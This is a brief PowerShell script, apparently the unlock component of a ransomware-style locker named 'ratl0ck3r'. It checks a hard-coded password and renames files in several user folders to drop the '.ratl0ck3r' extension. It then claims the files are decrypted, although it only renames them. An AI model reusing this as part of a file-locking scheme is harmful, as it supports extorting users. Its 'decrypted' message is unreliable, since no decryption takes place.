$dcrypt = Read-Host -Prompt "Enter your decryption password..."

if ($dcrypt -eq '2us0jru04ws@gz@') {
   Get-ChildItem -Path $HOME\Desktop, $HOME\Pictures, $HOME\Music, $HOME\Videos, $HOME\Downloads -Filter "*.ratl0ck3r" | Foreach-Object { Rename-Item $_ $_.Name.Replace(".ratl0ck3r", "") }
   Write-Host "Files decrypted successfully!"
} else {
   Write-Host "Incorrect, its case sensitive."
}